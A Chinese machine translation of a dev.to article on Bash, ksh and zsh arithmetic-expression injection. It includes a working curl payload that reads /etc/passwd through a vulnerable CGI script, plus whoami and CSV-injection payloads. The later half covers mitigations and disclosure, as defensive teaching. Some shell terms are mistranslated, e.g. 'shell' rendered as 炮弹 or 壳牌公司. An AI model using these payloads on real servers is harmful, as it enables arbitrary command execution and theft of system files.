# 可以利用外壳脚本中的算术运算

> 原文：<https://dev.to/greymd/eq-can-be-critically-vulnerable-338m>

# 是否不堪一击？

下面是名为`index.cgi`的简单 Bash 脚本。
应该是用来做 CGI 的。
获取客户端提供的名为`num`的参数，检查`num`是否等于 100。

```
#!/bin/bash
printf "Content-type: text\n\n"
read PARAMS
NUM="${PARAMS#num=}"
if [[ "$NUM" -eq 100 ]];then echo "OK"
else echo "NG"
fi 
```

这样很好。

```
$ curl -d num=100 http://localhost/index.cgi
OK

$ curl -d num=101 http://localhost/index.cgi
NG 
```

此外，空参数、非数字参数和任何其他无效参数都会被正确拒绝。

```
$ curl http://localhost/index.cgi
NG

$ curl -d num='' http://localhost/index.cgi
NG

$ curl -d num=abcdefg http://localhost/index.cgi
NG

$ curl -d num='true ]] && [[ 100' http://localhost/index.cgi
NG

$ curl -d num='\\;"\\"""""";;;~``~\\' http://localhost/index.cgi
NG 
```

完美。足够安全了，不是吗？

然而，这个脚本实际上是可利用的。
它存在任意代码执行漏洞。
你能猜出哪条线有问题吗？

```
#!/bin/bash
printf "Content-type: text\n\n"
read PARAMS
NUM="${PARAMS#num=}"
if [[ "$NUM" -eq 100 ]];then echo "OK"
else echo "NG"
fi 
```

思考 1 分钟...

...

你拿到了吗？

问题是这条线。

```
if [[ "$NUM" -eq 100 ]];then 
```

让我们执行这个命令。

```
$ curl -d num='x[$(cat /etc/passwd > /proc/$$/fd/1)]' http://localhost/index.cgi 
```

这是结果。Web 服务器的
`/etc/passwd`暴露了！耶！

```
$ curl -d num='x[$(cat /etc/passwd > /proc/$$/fd/1)]' http://localhost/index.cgi
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
gnome-initial-setup:x:126:65534::/run/gnome-initial-setup/:/bin/false
gdm:x:127:130:Gnome Display Manager:/var/lib/gdm3:/bin/false
NG 
```

这种行为还可能导致 CSV 注入、权限提升等(见下文)。

我来解释一下这种现象的技术原因。

## 读之前

本文基于 [@yamaya](https://twitter.com/yamaya) 撰写的[报道(日文)](http://ya.maya.st/d/201909a.html)。
本文中的所有样本都经过以下版本的检查。

```
$ bash --version
GNU bash, version 5.0.0(1)-release (x86_64-pc-linux-gnu)

$ ksh --version
  version         sh (AT&T Research) 93u+ 2012-08-01

$ zsh --version
zsh 5.4.2 (x86_64-ubuntu-linux-gnu)

$ mksh -c 'echo $KSH_VERSION'
@(#)MIRBSD KSH R56 2018/01/14 
```

请注意，据我所知，第一次 PoC 仅适用于`bash`和`mksh`。
但是类似的行为在后面提到的`zsh`和类似 ksh 的炮弹(`ksh`、`pdksh`中得到证实。
`ash`和`dash`据我所知不受影响。

# shell 脚本的算术表达式

不仅是`bash`，还有`zsh`、`ksh`等等...像普通编程语言一样计算整型变量。
但是，并不只是求值为“整数”，而是“算术表达式”。

“算术表达式”是指用于数学计算的各种表达式，如各种运算符、数组、赋值等。【bash 参见手册 [6.5 Shell 算术](https://www.gnu.org/software/bash/manual/bash.html#Shell-Arithmetic)。

算术表达式的求值方式导致了无意行为。
例如，这里有一个简单的脚本叫做`hoge.sh`(这个例子来自于[报道的文章](http://ya.maya.st/d/201909a.html))。

```
#!/bin/bash
typeset -i n # declare "n" as integer type ("typeset" is same as "declare")
a=5
n="$1"
echo "$a" 
```

它只是打印出`a`的值。
这个脚本有望随时打印`5`。
即使用户提供任何值，`n`也只受影响，`a`不受影响。

目前为止可以吗？

但是，当参数为`a=10`时，会显示意外的结果。

```
$ ./hoge.sh a=10
10 
```

为什么会这样？
因为参数被求值为“算术表达式”。这里是解释这种行为的 Bash 手册。

[4.2 Bash 内置命令- Bash 参考手册](https://www.gnu.org/software/bash/manual/bash.html#Bash-Builtins)

> 声明
> ...
> -i
> 变量被当作一个整数；当变量被赋值时，执行算术求值(参见 Shell 算术)。

可以看到，`n`是由`typeset -i`声明的。
那么，`n="$1"`并不意味着 **`n`被赋值为 1 美元**。
表示 **`n`被赋值为算术表达式**计算出的$1 的结果。

因为`n`被声明为整数，所以当这个变量被赋值时执行求值。

`a`的值被覆盖，因为`a=10`被正确评估，因为它具有正确的运算符(赋值)作为算术表达式。

[6.5 Shell 算术- Bash 参考手册](https://www.gnu.org/software/bash/manual/bash.html#Shell-Arithmetic)

> = *= /= %= += -= <<= > >= &= <sup>=</sup> |=
> 
> 作业

这看起来很不直观，但是在 bash 的手册上有明确的记载。

请注意，这与`zsh`、`ksh`等炮弹相同。

```
$ ./hoge.zsh a=10
10

./hoge.ksh a=10
10 
```

在这种情况下，`n`由`=`操作员分配给`$1`。
然而，即使赋值是由`read n`(使用标准输入作为值)或`n=$(command)`(使用`command`的结果作为值)执行的，该求值也将被执行。

让我解释一个更高级的例子。它并不广为人知，但任何外部命令都可以被称为算术表达式。
你可能知道，Shell 支持数组。

[数组- Bash 参考手册](https://www.gnu.org/software/bash/manual/bash.html#Arrays)

> 名称[下标]=值

它可以被解释为一个算术表达式。

```
$ (( x[0]=1, x[1]=2 ))
$ echo "${x[*]}"
1 2 
```

另外，**命令替换`$(command)`可以这样表述为数组的下标。**T3】

```
$ (( x[$(echo 0)]=100 ))
$ echo "${x[0]}"
100 
```

**这意味着，`x[$(command)]`作为算术表达式在语法上是正确的。**

哇，真有意思！让我们将上面的例子修改如下。

```
$ ./hoge.sh 'x[$(whoami>&2)]'
myuser
5 
```

如您所见，`whoami`命令被执行，用户名`myuser`被显示。
请注意`whoami`不是在当前 shell 上评估的。
如果用`sudo`运行这个例子就清楚了。

```
$ sudo ./hoge.sh 'x[$(whoami>&2)]'
root
5 
```

如果在当前 shell 上对`$(whoami>&2)`求值，结果必须是`myuser`而不是`root`。
表示`hoge.sh`作为特权进程执行，`whoami`在同一个进程中打印`root`。

## 其他受影响的表情

不仅`typeset -i`而且其他语法如`$(( ... ))`和`$[ ... ]`对于任意表达式也执行相同的过程。

```
#!/bin/bash
a=5
n=$(( $1 ))
echo "$a" 
```

```
$ sudo ./script.sh 'x[$(whoami>&2)]'
root
5 
```

令人惊讶的是，`[[ ... ]]`中使用的算术二元运算符(如`-eq`、`-le`)也是一样的。
这意味着运算符的操作数被评估为算术表达式。

```
#!/bin/bash
if [[ $1 -eq 0 ]]; then a=0
else a=1
fi 
```

```
$ sudo ./script.sh 'x[$(whoami>&2)]'
root 
```

在 shell 脚本中，算术表达式的求值在各种情况下执行。
例如[参数展开](https://www.gnu.org/software/bash/manual/bash.html#Shell-Expansions) `${var:offset:length}`中使用的`offset`和`length`也被求值为算术表达式。

## CSV 注射

[原始报告](http://ya.maya.st/d/201909a.html)的作者介绍了导致 [CSV 注射](http://georgemauer.net/2017/10/07/csv-injection.html)的以下脚本。这个脚本只是加载 CSV 文件，并为每一行运行简单的计算。

```
#!/bin/bash
csv="foo.csv"
while IFS=, read item price num; do echo "$item,$((price*num))"
done < "$csv" 
```

但是如果 CSV 文件包含这样的恶意输入，就会执行任意命令。

```
hoge,100,x[$(whoami>&2)] 
```

## 工作区

接下来我来讨论一下如何抑制来自 shell 脚本的恶意攻击。关键是要对外部输入感到紧张。

### 检查输入为字符串

`=~`比较字符串值的运算符不会将该值视为算术表达式。
如果值应该是数字，事先用正则表达式检查。

```
#!/bin/bash
typeset -i n
a="$1"
[[ $a =~ ^[0-9]*$ ]] && n=$a 
```

### 尽可能使用外部命令

最初，shell 是组合多个命令的“粘合”语言。你为什么不利用外部命令？

比如`[ ... ]`表情就不受这个问题影响。
因为它不解释 shell 的内置算术表达式，因为`[`是单独的命令。

```
$ which [
/usr/bin/[ 
```

因此，该脚本不容易受到攻击。

```
#!/bin/bash
if [ "$1" -eq 0 ]; then a=0
else a=1
fi 
```

```
./script.sh 'x[$(whoami>&2)]'
./script.sh: line 2: [: x[$(whoami>&2)]: integer expression expected 
```

我再介绍一个例子。
[bashcms](https://github.com/ryuichiueda/bashcms2) 是由 [@ryuichiueda](https://twitter.com/uedarobotics) 创建的用 Bash 编写的内容管理系统(cms)。他在这个 CMS 上发布自己的网站已经 6 年多了。
然而，他从未经历过安全问题和性能问题(正如他在书中所说)。
“bash CMS”使用外部命令过滤所有输入，因为它不直接将用户输入存储到外壳变量中。

[bash CMS 2/blob/master/bin/index . CGI](https://github.com/ryuichiueda/bashcms2/blob/master/bin/index.cgi)

```
dir="$(tr -dc 'a-zA-Z0-9_=' <<< ${QUERY_STRING} | sed 's;=;s/;')" 
```

# 再问:是漏洞吗？

这种行为非常不直观。如你所见，这种行为可能被用于恶意攻击。
为此，原文章作者向 IPA <sup id="fnref1">[1](#fn1)</sup> 报告了这个问题。

但是 IPA 判断不是译员本身的问题。
因此，开发商应该关注这个问题。
是的，从技术上来说这可能是对的。
实际上，正如我介绍的，这种行为在壳牌公司的手册上有记录。
不仅`bash`，而且`mksh`在其手册上也有关于它的小警告信息。

[mksh(1)](https://manpages.debian.org/experimental/mksh/mksh.1.en.html)

> 警告:这也会影响到到整数的隐式转换，例如 let 命令所做的。切勿在算术上下文中使用未经检查的用户输入，例如来自环境的输入！

如何看待这种行为？

你觉得这是脆弱吗？还是壳牌的预期行为？

对于如何编写安全的代码，你有其他的想法吗？

请评论，让我们讨论:)

* * *

1.  IPA:信息技术促进机构。为日本公民组织各种 ICT 活动的组织。这是一种公共组织，因为日本政府在财政上支持它。日本软件工程师可以向该组织报告软件漏洞，以便在必要时将它上报给其他利益相关方。 [↩](#fnref1)